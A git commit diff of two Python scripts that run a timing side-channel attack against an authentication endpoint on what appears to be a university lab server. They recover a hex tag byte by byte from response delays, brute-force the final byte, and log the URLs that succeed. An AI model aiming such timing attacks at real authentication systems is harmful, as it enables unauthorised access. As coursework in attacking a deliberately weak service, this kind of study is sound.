e106586a1af306cdbef6710227c3612d212146bf
Axel Alvin <axelalvin1996@gmail.com>
2022-02-03 10:11:27 +0100

    it works

--- brute_last.py
+++ brute_last.py
@@ -5,11 +5,18 @@ def listtostring(s):
 
 url = "http://dart.cse.kau.se:12345/auth/99/axelalvi/798fc0f1716e8ab23cba9273350555"
 
-charlist = ['a', 'b', 'c', 'd', 'e', 'f', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
+#charlist = ['a', 'b', 'c', 'd', 'e', 'f', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
+charlist = ['5', '9']
 #url = 'http://dart.cse.kau.se:12345/auth/100/axelalvi/'
 
 
 hexfinnishlist = []
+
+def appentofile(url):
+    # Open a file with access mode 'a'
+    with open("okurls.txt", "a") as file_object:
+        # Append 'hello' at the end of file
+        file_object.write(url)
 
 for i in charlist:
     for j in charlist:
@@ -20,4 +27,5 @@ for i in range(len(hexfinnishlist)):
     print("Testing: " + url + listtostring(hexfinnishlist[i]))
     if str(re) == "<Response [200]>":
         print("OK! Correct: " + listtostring(hexfinnishlist[i]))
+        appentofile(url + listtostring(hexfinnishlist[i]))
         break
--- hax.py
+++ hax.py
@@ -5,7 +5,22 @@ import urllib.parse
 
 import requests
 
+#-------------------------------------------------------------------------------------------
+#GLOBAL VARIABLES
+#-------------------------------------------------------------------------------------------
+charlist = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
 
+delay = 10
+name = "axelalvi"
+
+url = "http://dart.cse.kau.se:12345/auth/" + str(delay) + "/" + name + "/"
+
+#-------------------------------------------------------------------------------------------
+
+
+#-------------------------------------------------------------------------------------------
+#HELP FUNCTIONS
+#-------------------------------------------------------------------------------------------
 def listtostring(s):
     return (''.join([str(elem) for elem in s]))
 
@@ -30,120 +45,150 @@ def avg_rsp_time(url, runs):
 
     return total / runs
 
-#charlist = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',
-#            'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
+def appentofile(url):
+    # Open a file with access mode 'a'
+    with open("okurls.txt", "a") as file_object:
+        # Append 'hello' at the end of file
+        file_object.write(url)
 
-charlist = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
-#url = 'http://dart.cse.kau.se:12345/auth/100/axelalvi/'
+#-------------------------------------------------------------------------------------------
 
-delay = 99
-name = "axelalvi"
 
-url = "http://dart.cse.kau.se:12345/auth/" + str(delay) + "/" + name + "/"
-
+#-------------------------------------------------------------------------------------------
+#create list of all hex numbers (00 - ff)
+#-------------------------------------------------------------------------------------------
 hexlist = []
 
 for i in charlist:
     for j in charlist:
         hexlist.append(f"{i}{j}")
+#-------------------------------------------------------------------------------------------
 
-#get avg rsp to add to intervals
-print(url + ("0" * 32))
-general_rsp_time = avg_rsp_time(url + ("0" * 32), 20)
-print(general_rsp_time)
+#-------------------------------------------------------------------------------------------
+#get avg rsp to add to intervals since response depends on "timing jitters", multiply by 2 for safety
+#-------------------------------------------------------------------------------------------
+general_rsp_time = avg_rsp_time(url + ("0" * 32), 100) * 2
+#general_rsp_time = avg_rsp_time("https://www.vecka.nu", 100)
+print("General rsp time: " + str(general_rsp_time) + " ms")
 time.sleep(2)
+#-------------------------------------------------------------------------------------------
 
+
+#-------------------------------------------------------------------------------------------
+#test until response is 200 (be patient)
+#-------------------------------------------------------------------------------------------
 while(True):
 
-    #find first hex in tag that by checking which one gives back a response time
-    temp_tag = ['00'] * 16
-    longest_rsp = -100
-    curr_first = ""
-    for hex in hexlist:
-        temp_tag[0] = hex
-        tag_string = listtostring(temp_tag)
-        print(tag_string)
-        #response = requests.get(url + tag_string)
-        rsp_time = min_rsp_time(url + tag_string, 1)#response.elapsed.total_seconds() * 1000
-        print(rsp_time)
-        if(rsp_time > longest_rsp and rsp_time < (delay + general_rsp_time)):
-            longest_rsp = rsp_time
-            curr_first = hex
-            if rsp_time > (delay + 15):
-                break
-    print(curr_first)
-    #curr_first will now be the first hex in tag
-
-
-    guessedtag = [curr_first] * 16
-    besthex = ""
-    wrong_guess = False
-
-    i = 1
-    while i < len(guessedtag) - 1:
-    #for i in range(1,len(guessedtag)):
-        #if rq_time is less than i * delay, we know we guessed wrong and want to try previous i again
-        if wrong_guess is True:
-            if i < 3:
-                break
-            i -= 2
-            wrong_guess = False
-        current_longest = -100
-        print(f"index {i}, guessedtag: {listtostring(guessedtag)}")
-        avragetime = [0] * 10
-        #200 is delay
-        #reasonable = 300 + (i*300)
-        sweetspot_top = (i + 1) * delay + general_rsp_time
-        print("sweet top: " + str(sweetspot_top))
-        sweetspot_bottom = (i + 1) * delay
-
-        minimum_rsp_time = i * delay
-
+    url = "http://dart.cse.kau.se:12345/auth/" + str(delay) + "/" + name + "/"
+    #delay += 10
+    print("Testing delay: " + str(delay))
+    time.sleep(2)
+    count_runs = 0
+    while(count_runs < 5):
+        count_runs += 1
+        #-------------------------------------------------------------------------------------------
+        #find first hex in tag that by checking which one gives back a response time inside desired interval
+        #-------------------------------------------------------------------------------------------
+        temp_tag = ['00'] * 16
+        longest_rsp = -100
+        curr_first = ""
         for hex in hexlist:
-            print(f"index {i} char: {hex} besthex: {besthex} curr_long: {current_longest}")
-            guessedtag[i] = hex
-            newtag = listtostring(guessedtag)
-            rq_time = min_rsp_time((url + newtag), 1)
-            print(rq_time)
-            if(rq_time < minimum_rsp_time):
-                wrong_guess = True
-                break
-            if(rq_time > current_longest and rq_time < sweetspot_top):
-                current_longest = rq_time
-                besthex = hex
-                if(current_longest > sweetspot_bottom):
-                    #we found a candidate, now we want to see if it is correct by adding it to a temp guessedlist
-                    #and check the response time for that list. If response time is above next minimum rsp time, we break here
-                    #otherwise, the candidate was not correct and we continue looking
-                    temp_list = guessedtag
-                    temp_list[i] = besthex
-                    temp_list_string = listtostring(temp_list)
-                    temp_rq_time = min_rsp_time((url + temp_list_string), 10)
-                    next_min_rsp_time = (i + 1) * delay
-                    next_max_rsp_time = ((i + 1) * delay) + delay
-                    print(f"trying: {besthex} next_min: {next_min_rsp_time} temp_rq_time: {temp_rq_time} next_max: {next_max_rsp_time}")
-                    if temp_rq_time > next_min_rsp_time and temp_rq_time < next_max_rsp_time:
-                        break
-                    else:
-                        current_longest = -100
-                        best_hex = ""
+            temp_tag[0] = hex
+            tag_string = listtostring(temp_tag)
+            rsp_time = min_rsp_time(url + tag_string, 1)
+            print(f"char: {hex} rsp_time: {rsp_time} besthex: {curr_first} longest_rsp {longest_rsp}")
+            if(rsp_time > longest_rsp and rsp_time < (delay + general_rsp_time)):
+                longest_rsp = rsp_time
+                curr_first = hex
+                if rsp_time > (delay + 15):
+                    break
+        #-------------------------------------------------------------------------------------------
 
-        guessedtag[i] = besthex
-        i += 1
+        #-------------------------------------------------------------------------------------------
+        #make guessed hex first (& all) hex in guessed tag
+        #-------------------------------------------------------------------------------------------
+        guessedtag = [curr_first] * 16
+        besthex = ""
+        wrong_guess = False
+        #-------------------------------------------------------------------------------------------
 
-    if i > 14:
+        #-------------------------------------------------------------------------------------------
+        #go through guessed tag hex by hex, until only hex remains
+        #-------------------------------------------------------------------------------------------
+        i = 1
+        while i < len(guessedtag) - 1:
+
+            current_longest = -100
+            sweetspot_top = (i + 1) * delay + general_rsp_time
+            sweetspot_bottom = (i + 1) * delay
+            minimum_rsp_time = i * delay
+
+            #if rq_time is less than i * delay, we know we guessed wrong and want to try previous i again
+            if wrong_guess is True:
+                if i < 3:
+                    wrong_guess = False
+                    break
+                i -= 2
+                wrong_guess = False
+
+            
+            print(f"index {i}, guessedtag: {listtostring(guessedtag)}")
+
+            for hex in hexlist:
+                print(f"index {i} char: {hex} besthex: {besthex} curr_long: {current_longest}")
+                guessedtag[i] = hex
+                newtag = listtostring(guessedtag)
+                rq_time = min_rsp_time((url + newtag), 1)
+                print(rq_time)
+                if(rq_time < minimum_rsp_time):
+                    wrong_guess = True
+                    break
+                if(rq_time > current_longest and rq_time < sweetspot_top):
+                    current_longest = rq_time
+                    besthex = hex
+                    if(current_longest > sweetspot_bottom):
+                        #we found a candidate, now we want to see if it is correct by adding it to a temp guessedlist
+                        #and check the response time for that list. If response time is above next minimum rsp time, we break here
+                        #otherwise, the candidate was not correct and we continue looking
+                        temp_list = guessedtag
+                        temp_list[i] = besthex
+                        temp_list_string = listtostring(temp_list)
+                        temp_rq_time = min_rsp_time((url + temp_list_string), 10)
+                        next_min_rsp_time = (i + 1) * delay
+                        next_max_rsp_time = ((i + 1) * delay) + delay
+                        print(f"trying: {besthex} next_min: {next_min_rsp_time} temp_rq_time: {temp_rq_time} next_max: {next_max_rsp_time}")
+                        if temp_rq_time > next_min_rsp_time and temp_rq_time < next_max_rsp_time:
+                            break
+                        else:
+                            current_longest = -100
+                            best_hex = ""
+
+            guessedtag[i] = besthex
+            i += 1
+            #-------------------------------------------------------------------------------------------
+        
+        #-------------------------------------------------------------------------------------------
         #brute force last hex until response is 200
-        for hex in hexlist:
-            guessedtag[15] = hex
-            re = requests.get(url + listtostring(guessedtag))
-            print("Testing: " + url + listtostring(guessedtag))
-            if str(re) == "<Response [200]>":
-                print("OK! Correct: " + url + listtostring(guessedtag))
-                break
-    
-    print(listtostring(guessedtag))
+        #-------------------------------------------------------------------------------------------
+        if i > 14:
+            for hex in hexlist:
+                guessedtag[15] = hex
+                re = requests.get(url + listtostring(guessedtag))
+                print("Testing: " + url + listtostring(guessedtag))
+                if str(re) == "<Response [200]>":
+                    print("OK! Correct: " + url + listtostring(guessedtag))
+                    appentofile("Delay: " + str(delay) + ", URL: " + url + listtostring(guessedtag))
+                    break
+        #-------------------------------------------------------------------------------------------
 
-    re = requests.get(url + listtostring(guessedtag))
-    if str(re) == "<Response [200]>":
-        print("OK!")
-        break
+        #-------------------------------------------------------------------------------------------
+        #test and break if response is 200
+        #-------------------------------------------------------------------------------------------
+        re = requests.get(url + listtostring(guessedtag))
+        if str(re) == "<Response [200]>":
+            print("OK!")
+            break
+        #-------------------------------------------------------------------------------------------
+    delay += 10
+#-------------------------------------------------------------------------------------------
+
